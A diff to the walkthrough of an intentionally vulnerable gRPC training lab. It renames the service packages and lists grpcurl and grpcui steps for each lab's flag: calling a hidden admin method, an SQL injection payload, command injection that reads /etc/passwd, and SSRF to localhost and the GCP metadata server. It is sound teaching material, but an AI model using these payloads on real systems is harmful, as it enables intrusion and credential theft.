@@ -34,7 +34,7 @@ grpcui will open a browser window. Use the **Service** and **Method** dropdowns 
 
 ## Lab 001 — gRPC Reflection Enabled
 
-**Vulnerability**: Reflection is enabled, exposing all services and methods including a hidden admin endpoint that returns sensitive data without any authentication.
+**Vulnerability**: Reflection is enabled, exposing all services and methods including a hidden admin endpoint. The endpoint requires an `admin-token` header but accepts any non-empty value.
 
 ### grpcurl
 
@@ -43,22 +43,22 @@ grpcui will open a browser window. Use the **Service** and **Method** dropdowns 
 grpcurl <HOST> list
 
 # Discover methods on ServiceDiscovery
-grpcurl <HOST> list servicediscovery.ServiceDiscovery
+grpcurl <HOST> list lab001servicediscovery.ServiceDiscovery
 
 # Call the public endpoint
-grpcurl <HOST> servicediscovery.ServiceDiscovery/ListServices
+grpcurl <HOST> lab001servicediscovery.ServiceDiscovery/ListServices
 
-# Call the hidden admin endpoint — no auth required
-grpcurl -d '{}' <HOST> servicediscovery.ServiceDiscovery/AdminListAllServices
+# Call the hidden admin endpoint — any non-empty token is accepted
+grpcurl -d '{"adminToken": "anything"}' <HOST> lab001servicediscovery.ServiceDiscovery/AdminListAllServices
 ```
 
 ### grpcui
 
 1. Connect: `grpcui <HOST>`
-2. Select service: `servicediscovery.ServiceDiscovery`
+2. Select service: `lab001servicediscovery.ServiceDiscovery`
 3. Select method: `AdminListAllServices`
-4. Leave `admin_token` blank and click **Invoke**
-5. The flag appears in the response under `flag`
+4. Set `admin_token` to any non-empty value
+5. Click **Invoke** — the flag appears in the response under `flag`
 
 **Flag**: `GRPC_GOAT{reflection_exposes_hidden_admin_methods}`
 
@@ -72,19 +72,19 @@ grpcurl -d '{}' <HOST> servicediscovery.ServiceDiscovery/AdminListAllServices
 
 ```bash
 # Normal lookup
-grpcurl -d '{"username": "john"}' <HOST> userdirectory.UserDirectory/SearchUsers
+grpcurl -d '{"username": "john"}' <HOST> lab007userdirectory.UserDirectory/SearchUsers
 
 # SQL injection to dump all rows
-grpcurl -d '{"username": "x'\'' OR '\''1'\''='\''1"}' <HOST> userdirectory.UserDirectory/SearchUsers
+grpcurl -d '{"username": "x'\'' OR '\''1'\''='\''1"}' <HOST> lab007userdirectory.UserDirectory/SearchUsers
 
 # Direct lookup of the flag user
-grpcurl -d '{"username": "flag_user"}' <HOST> userdirectory.UserDirectory/SearchUsers
+grpcurl -d '{"username": "flag_user"}' <HOST> lab007userdirectory.UserDirectory/SearchUsers
 ```
 
 ### grpcui
 
 1. Connect: `grpcui <HOST>`
-2. Select service: `userdirectory.UserDirectory`, method: `SearchUsers`
+2. Select service: `lab007userdirectory.UserDirectory`, method: `SearchUsers`
 3. Set `username` to `x' OR '1'='1` (the form handles quoting for you)
 4. Click **Invoke** — all users including the flag user are returned
 
@@ -100,22 +100,22 @@ grpcurl -d '{"username": "flag_user"}' <HOST> userdirectory.UserDirectory/Search
 
 ```bash
 # Normal usage
-grpcurl -d '{"directory": "/tmp"}' <HOST> fileprocessor.FileProcessor/ListFiles
+grpcurl -d '{"directory": "/tmp"}' <HOST> lab008fileprocessor.FileProcessor/ListFiles
 
 # Inject a second command
-grpcurl -d '{"directory": "/tmp; id"}' <HOST> fileprocessor.FileProcessor/ListFiles
+grpcurl -d '{"directory": "/tmp; id"}' <HOST> lab008fileprocessor.FileProcessor/ListFiles
 
 # Read /etc/passwd
-grpcurl -d '{"directory": "/tmp; cat /etc/passwd"}' <HOST> fileprocessor.FileProcessor/ListFiles
+grpcurl -d '{"directory": "/tmp; cat /etc/passwd"}' <HOST> lab008fileprocessor.FileProcessor/ListFiles
 
 # Read the flag file
-grpcurl -d '{"directory": "/tmp; cat /flag.txt"}' <HOST> fileprocessor.FileProcessor/ListFiles
+grpcurl -d '{"directory": "/tmp; cat /flag.txt"}' <HOST> lab008fileprocessor.FileProcessor/ListFiles
 ```
 
 ### grpcui
 
 1. Connect: `grpcui <HOST>`
-2. Select service: `fileprocessor.FileProcessor`, method: `ListFiles`
+2. Select service: `lab008fileprocessor.FileProcessor`, method: `ListFiles`
 3. Set `directory` to `/tmp; cat /etc/passwd`
 4. Click **Invoke** — the injected command output appears in `output`
 
@@ -133,19 +133,19 @@ An internal HTTP server runs on `localhost:9090` inside the container. It is not
 
 ```bash
 # Normal usage
-grpcurl -d '{"url": "https://example.com"}' <HOST> imagepreview.ImagePreview/FetchImage
+grpcurl -d '{"url": "https://example.com"}' <HOST> lab009imagepreview.ImagePreview/FetchImage
 
 # SSRF to the internal flag server
-grpcurl -d '{"url": "http://localhost:9090/flag"}' <HOST> imagepreview.ImagePreview/FetchImage
+grpcurl -d '{"url": "http://localhost:9090/flag"}' <HOST> lab009imagepreview.ImagePreview/FetchImage
 
 # On GCP — probe the metadata server
-grpcurl -d '{"url": "http://metadata.google.internal/computeMetadata/v1/"}' <HOST> imagepreview.ImagePreview/FetchImage
+grpcurl -d '{"url": "http://metadata.google.internal/computeMetadata/v1/"}' <HOST> lab009imagepreview.ImagePreview/FetchImage
 ```
 
 ### grpcui
 
 1. Connect: `grpcui <HOST>`
-2. Select service: `imagepreview.ImagePreview`, method: `FetchImage`
+2. Select service: `lab009imagepreview.ImagePreview`, method: `FetchImage`
 3. Set `url` to `http://localhost:9090/flag`
 4. Click **Invoke** — the flag is returned in `content`
 
